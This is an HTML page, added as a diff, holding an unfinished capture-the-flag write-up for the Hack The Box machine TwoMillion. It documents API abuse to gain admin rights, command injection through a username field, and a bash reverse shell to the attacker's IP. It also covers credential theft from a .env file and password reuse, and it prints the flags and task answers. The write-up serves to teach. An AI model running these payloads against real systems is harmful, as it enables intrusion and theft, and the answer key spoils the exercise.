@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TwoMillion | Hack The Box Easy Linux Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #111111;
+            --accent-blue: #00e5ff;
+            --text-main: #e0e0e0;
+            --text-dim: #999;
+            --border-color: #222;
+            --mono-font: 'JetBrains Mono', monospace;
+            --warning: #ffaa33;
+            --success: #00ff88;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1000px;
+            width: 90%;
+            padding: 4rem 0;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .back-link {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-size: 0.8rem;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .category {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.8rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            margin: 0;
+            letter-spacing: -1px;
+            background: linear-gradient(to right, #fff, #666);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: rgba(255, 170, 51, 0.2);
+            border: 1px solid var(--warning);
+            padding: 0.3rem 1rem;
+            border-radius: 20px;
+            font-family: var(--mono-font);
+            font-size: 0.7rem;
+            color: var(--warning);
+            margin-top: 1rem;
+        }
+
+        section {
+            margin-bottom: 4rem;
+        }
+
+        .section-num {
+            font-family: var(--mono-font);
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            border-left: 3px solid var(--accent-blue);
+            padding-left: 1rem;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        h3 {
+            font-size: 1.2rem;
+            color: #fff;
+            margin: 1.5rem 0 0.8rem 0;
+        }
+
+        p {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+            line-height: 1.7;
+        }
+
+        strong {
+            color: #fff;
+        }
+
+        code {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            background: rgba(0, 229, 255, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+
+        pre {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: var(--mono-font);
+            overflow-x: auto;
+            color: var(--accent-blue);
+            font-size: 0.85rem;
+            margin: 1rem 0;
+        }
+
+        .table-container {
+            overflow-x: auto;
+            margin: 2rem 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: var(--mono-font);
+            font-size: 0.85rem;
+        }
+
+        th {
+            text-align: left;
+            padding: 0.8rem;
+            border-bottom: 2px solid var(--border-color);
+            color: #fff;
+            text-transform: uppercase;
+        }
+
+        td {
+            padding: 0.8rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-dim);
+        }
+
+        tr:hover td {
+            color: var(--accent-blue);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .flag-box {
+            background: linear-gradient(45deg, #001a1a, #000);
+            border: 1px solid var(--accent-blue);
+            padding: 1.5rem;
+            text-align: center;
+            border-radius: 4px;
+            margin: 1.5rem 0;
+        }
+
+        .flag-label {
+            display: block;
+            font-family: var(--mono-font);
+            font-size: 0.7rem;
+            color: var(--accent-blue);
+            margin-bottom: 0.5rem;
+            letter-spacing: 1px;
+        }
+
+        .flag-text {
+            font-family: var(--mono-font);
+            font-size: 1.2rem;
+            color: #fff;
+            word-break: break-all;
+        }
+
+        .note {
+            background: rgba(0, 229, 255, 0.05);
+            border-left: 3px solid var(--accent-blue);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-note {
+            background: rgba(255, 170, 51, 0.05);
+            border-left: 3px solid var(--warning);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .explanation {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 1rem;
+            border-radius: 4px;
+            margin: 1rem 0;
+            font-style: italic;
+        }
+
+        footer {
+            margin-top: 5rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-color);
+            font-family: var(--mono-font);
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            text-align: right;
+        }
+
+        .highlight {
+            color: var(--accent-blue);
+        }
+        
+        .command-table td:first-child {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <a href="#" class="back-link">← Back to Writeups</a>
+        <h1>TwoMillion</h1>
+        <p style="margin-top: 0.5rem;">Hack The Box - Easy Linux Machine</p>
+        <div class="status-badge">USER FLAG OBTAINED - ROOT IN PROGRESS</div>
+    </header>
+
+    <section>
+        <div class="section-num">/ 01</div>
+        <h2>Machine Information</h2>
+        
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr><th>Detail</th><th>Value</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>IP Address</td><td>10.129.229.66</td></tr>
+                    <tr><td>Difficulty</td><td>Easy (4.6/10)</td></tr>
+                    <tr><td>OS</td><td>Linux (Ubuntu)</td></tr>
+                    <tr><td>Open Ports</td><td>22 (SSH), 80 (HTTP)</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 02</div>
+        <h2>Step 1: Port Scanning</h2>
+        
+        <pre><code>nmap -p 22,80 -sC -sV 10.129.229.66
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+80/tcp open  http    nginx
+|_http-title: Did not follow redirect to http://2million.htb/</code></pre>
+
+        <h3>Command Explanation</h3>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>nmap</td><td>Network scanning tool for discovering open ports and services</td></tr>
+                    <tr><td>-p 22,80</td><td>Scan only ports 22 and 80 (SSH and HTTP)</td></tr>
+                    <tr><td>-sC</td><td>Run default security scripts for service enumeration</td></tr>
+                    <tr><td>-sV</td><td>Attempt version detection of running services</td></tr>
+                    <tr><td>10.129.229.66</td><td>Target IP address</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Fixing the Hostname</h3>
+        <p>The web server redirects to <code>2million.htb</code>, which does not resolve by default.</p>
+        <pre><code>echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>echo "10.129.229.66 2million.htb"</td><td>Create a line mapping IP to hostname</td></tr>
+                    <tr><td>|</td><td>Pipe: send output to next command</td></tr>
+                    <tr><td>sudo</td><td>Execute with root privileges</td></tr>
+                    <tr><td>tee -a</td><td>Write and append to file (-a = append)</td></tr>
+                    <tr><td>/etc/hosts</td><td>Local DNS resolution file</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 03</div>
+        <h2>Step 2: API Discovery</h2>
+        
+        <h3>Invite API Endpoint</h3>
+        <pre><code>curl http://2million.htb/api/v1
+
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1/invite/how/to/generate": "Instructions",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code"
+      }
+    }
+  }
+}</code></pre>
+
+        <h3>Generating Invite Code</h3>
+        <pre><code>curl -X POST http://2million.htb/api/v1/invite/generate
+
+{"0":200,"success":1,"data":{"code":"QVVTR0gtTFRaSDgtWkoyOEEtN0FVMkU=","format":"encoded"}}</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>curl -X POST</td><td>Send an HTTP POST request</td></tr>
+                    <tr><td>/api/v1/invite/generate</td><td>API endpoint that creates new invite codes</td></tr>
+                    <tr><td>"code":"QVVTR0gt..."</td><td>Base64 encoded invite code</td></tr>
+                    <tr><td>"format":"encoded"</td><td>Indicates the code requires decoding</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Decoding the Invite Code</h3>
+        <pre><code>echo "QVVTR0gtTFRaSDgtWkoyOEEtN0FVMkU=" | base64 -d
+AUSGH-LTZH8-ZJ28A-7AU2E</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>echo</td><td>Print the base64 string</td></tr>
+                    <tr><td>|</td><td>Pipe output to next command</td></tr>
+                    <tr><td>base64 -d</td><td>Decode from base64 (-d = decode)</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="flag-box">
+            <span class="flag-label">INVITE CODE</span>
+            <div class="flag-text">AUSGH-LTZH8-ZJ28A-7AU2E</div>
+        </div>
+
+        <h3>Setting Invite Code in Browser</h3>
+        <pre><code>localStorage.setItem('inviteCode', 'AUSGH-LTZH8-ZJ28A-7AU2E');</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>localStorage</td><td>Browser storage API for persisting key-value pairs</td></tr>
+                    <tr><td>.setItem(key, value)</td><td>Store a value under the specified key</td></tr>
+                    <tr><td>'inviteCode'</td><td>The key the registration form reads from</td></tr>
+                    <tr><td>'AUSGH-LTZH8-...'</td><td>The decoded invite code value</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 04</div>
+        <h2>Step 3: Privilege Escalation to Admin</h2>
+
+        <h3>Enumerating Authenticated API</h3>
+        <pre><code>curl http://2million.htb/api/v1
+
+{
+  "v1": {
+    "user": { ... },
+    "admin": {
+      "GET": { "/api/v1/admin/auth": "Check admin status" },
+      "POST": { "/api/v1/admin/vpn/generate": "Generate VPN for user" },
+      "PUT": { "/api/v1/admin/settings/update": "Update user settings" }
+    }
+  }
+}</code></pre>
+
+        <h3>Admin Privilege Escalation</h3>
+        <pre><code>curl -c cookies.txt -b cookies.txt -X PUT http://2million.htb/api/v1/admin/settings/update \
+  -H "Content-Type: application/json" \
+  -d '{"email":"cyb3r3lla@htb.com","is_admin":1}'
+
+{"id":13,"username":"cyb3r3lla","is_admin":1}</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>-c cookies.txt</td><td>Save cookies from response to file</td></tr>
+                    <tr><td>-b cookies.txt</td><td>Send cookies from file (maintains session)</td></tr>
+                    <tr><td>-X PUT</td><td>HTTP PUT method for updating resources</td></tr>
+                    <tr><td>-H "Content-Type: application/json"</td><td>Set request header for JSON data</td></tr>
+                    <tr><td>-d '{...}'</td><td>Request body data</td></tr>
+                    <tr><td>"is_admin":1</td><td>Set admin flag to true (1)</td></tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="warning-note">
+            <strong>Vulnerability:</strong> The <code>/api/v1/admin/settings/update</code> endpoint allowed any authenticated user to escalate to admin by setting <code>"is_admin":1</code>.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 05</div>
+        <h2>Step 4: Command Injection</h2>
+
+        <h3>Testing Command Injection with Ping</h3>
+        <pre><code>curl -c cookies.txt -b cookies.txt -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Content-Type: application/json" \
+  -d '{"username":"cyb3r3lla; ping -c 4 10.10.14.29"}'</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>"username":"cyb3r3lla; ping..."</td><td>Semicolon (;) separates commands in Linux</td></tr>
+                    <tr><td>ping -c 4 10.10.14.29</td><td>Send 4 ICMP packets to attacker IP</td></tr>
+                    <tr><td>10.10.14.29</td><td>Attacker's VPN IP address</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Setting Up Listener</h3>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>nc</td><td>Netcat - network utility for reading/writing network connections</td></tr>
+                    <tr><td>-l</td><td>Listen mode (wait for incoming connection)</td></tr>
+                    <tr><td>-v</td><td>Verbose output</td></tr>
+                    <tr><td>-n</td><td>No DNS resolution (use IPs directly)</td></tr>
+                    <tr><td>-p 4444</td><td>Listen on port 4444</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Reverse Shell Payload</h3>
+        <pre><code>curl -c cookies.txt -b cookies.txt -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Content-Type: application/json" \
+  -d '{"username":"cyb3r3lla; bash -c \"bash -i >& /dev/tcp/10.10.14.29/4444 0>&1\""}'</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>bash -c</td><td>Execute the following string as a bash command</td></tr>
+                    <tr><td>bash -i</td><td>Start an interactive bash shell</td></tr>
+                    <tr><td>>&</td><td>Redirect both stdout and stderr</td></tr>
+                    <tr><td>/dev/tcp/10.10.14.29/4444</td><td>Bash special device for TCP connections</td></tr>
+                    <tr><td>0>&1</td><td>Redirect stdin to the same location as stdout</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="note">
+            <strong>Result:</strong> Reverse shell obtained as <code>www-data</code>.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 06</div>
+        <h2>Step 5: User Flag</h2>
+
+        <h3>Database Credentials</h3>
+        <pre><code>www-data@2million:~/html$ cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123</code></pre>
+
+        <h3>Switch to Admin User</h3>
+        <pre><code>www-data@2million:~/html$ su admin
+Password: SuperDuperPass123
+
+admin@2million:/var/www/html$</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>su admin</td><td>Switch user to 'admin' (requires password)</td></tr>
+                    <tr><td>SuperDuperPass123</td><td>Password reused from .env file</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>User Flag</h3>
+        <pre><code>admin@2million:~$ cat /home/admin/user.txt
+2ff2b02b59a12691b1e916756fed0545</code></pre>
+        <div class="flag-box">
+            <span class="flag-label">USER FLAG</span>
+            <div class="flag-text">2ff2b02b59a12691b1e916756fed0545</div>
+        </div>
+
+        <h3>Email Discovery (Task 11)</h3>
+        <pre><code>admin@2million:/tmp$ cat /var/mail/admin
+From: ch4p &lt;ch4p@2million.htb&gt;
+To: admin &lt;admin@2million.htb&gt;
+Subject: Urgent: Patch System OS
+
+Hey admin, I'm know you're working as fast as you can to do the DB migration...
+HTB Godfather</code></pre>
+        
+        <div class="flag-box">
+            <span class="flag-label">TASK 11 - EMAIL SENDER</span>
+            <div class="flag-text">ch4p@2million.htb</div>
+        </div>
+
+        <h3>GLIBC Version (Task 14)</h3>
+        <pre><code>admin@2million:/tmp$ ldd --version
+ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>ldd --version</td><td>Display the GNU C Library (glibc) version</td></tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="flag-box">
+            <span class="flag-label">TASK 14 - GLIBC VERSION</span>
+            <div class="flag-text">2.35</div>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 07</div>
+        <h2>Step 6: Root Access Attempts</h2>
+
+        <h3>Kernel Version</h3>
+        <pre><code>admin@2million:~$ uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
+        <div class="table-container">
+            <table class="command-table">
+                <thead><tr><th>Part</th><th>Meaning</th></tr></thead>
+                <tbody>
+                    <tr><td>uname -a</td><td>Display all system information (kernel name, version, hostname, etc.)</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Attempted Exploits</h3>
+        <ul>
+            <li><strong>Dirty Cow (CVE-2016-5195)</strong> - Failed (process hung)</li>
+            <li><strong>Pwnkit (CVE-2021-4034)</strong> - Failed (<code>pkexec</code> lacks SUID bit)</li>
+            <li><strong>Dirty Pipe (CVE-2022-0847)</strong> - Failed (system() call failed)</li>
+            <li><strong>CVE-2021-3156 (Baron Samedit)</strong> - Failed (patched)</li>
+            <li><strong>CVE-2023-0386 (OverlayFS)</strong> - Compilation issues</li>
+        </ul>
+
+        <div class="warning-note">
+            <strong>ROOT ACCESS NOT YET ACHIEVED</strong><br>
+            Privilege escalation vectors under investigation:
+            <ul>
+                <li>SUID binary enumeration</li>
+                <li>Cron job hijacking</li>
+                <li>Docker/LXD group escalation</li>
+                <li>Kernel exploit recompilation</li>
+            </ul>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 08</div>
+        <h2>Completed Tasks Summary</h2>
+        
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr><th>Task</th><th>Question</th><th>Answer</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>1</td><td>How many TCP ports are open?</td><td>2</td></tr>
+                    <tr><td>2</td><td>Name of the JavaScript file loaded by /invite page</td><td>inviteapi.min.js</td></tr>
+                    <tr><td>9</td><td>User Flag</td><td>2ff2b02b59a12691b1e916756fed0545</td></tr>
+                    <tr><td>11</td><td>Email address of the email sender</td><td>ch4p@2million.htb</td></tr>
+                    <tr><td>14</td><td>GLIBC version on TwoMillion</td><td>2.35</td></tr>
+                    <tr><td>12</td><td>Root Flag</td><td><span style="color: var(--warning);">PENDING</span></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 09</div>
+        <h2>Attack Chain Summary</h2>
+        
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr><th>Step</th><th>Action</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>1</td><td>Add <code>2million.htb</code> to /etc/hosts</td></tr>
+                    <tr><td>2</td><td>Generate invite code via <code>/api/v1/invite/generate</code></td></tr>
+                    <tr><td>3</td><td>Register user account</td></tr>
+                    <tr><td>4</td><td>Escalate to admin via <code>/api/v1/admin/settings/update</code></td></tr>
+                    <tr><td>5</td><td>Execute command injection via <code>/api/v1/admin/vpn/generate</code></td></tr>
+                    <tr><td>6</td><td>Obtain reverse shell as <code>www-data</code></td></tr>
+                    <tr><td>7</td><td>Find database credentials in <code>.env</code></td></tr>
+                    <tr><td>8</td><td><code>su admin</code> using discovered password</td></tr>
+                    <tr><td>9</td><td>Read user flag from <code>/home/admin/user.txt</code></td></tr>
+                    <tr><td>10</td><td>Read email from <code>/var/mail/admin</code> for Task 11</td></tr>
+                    <tr><td>11</td><td>Run <code>ldd --version</code> for Task 14</td></tr>
+                    <tr><td>12</td><td><span style="color: var(--warning);">PENDING: Privilege escalation to root</span></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 10</div>
+        <h2>Key Takeaways</h2>
+        
+        <ul>
+            <li>Virtual hosts must be added to <code>/etc/hosts</code> for proper resolution.</li>
+            <li>API enumeration reveals hidden endpoints and privilege escalation vectors.</li>
+            <li>The <code>/api/v1/admin/settings/update</code> endpoint allowed any authenticated user to become admin.</li>
+            <li>Command injection can be tested with <code>ping</code> before attempting a reverse shell.</li>
+            <li>Password reuse between database and system user credentials is a common misconfiguration.</li>
+            <li>Email files (<code>/var/mail/</code>) can contain useful information.</li>
+        </ul>
+    </section>
+
+    <section>
+        <div class="section-num">/ 11</div>
+        <h2>Tools Used</h2>
+        
+        <ul>
+            <li><strong>Nmap</strong> - Port scanning and service enumeration</li>
+            <li><strong>curl</strong> - API interaction and command injection</li>
+            <li><strong>Burp Suite / Browser DevTools</strong> - API discovery and request analysis</li>
+            <li><strong>netcat</strong> - Reverse shell listener</li>
+            <li><strong>Python HTTP Server</strong> - File transfer</li>
+        </ul>
+    </section>
+
+    <footer>
+        &copy; 2026 // CYBERSECURITY RESEARCH & EXPLOITATION // TWO MILLION // USER FLAG ACQUIRED
+    </footer>
+</div>
+
+</body>
+</html>
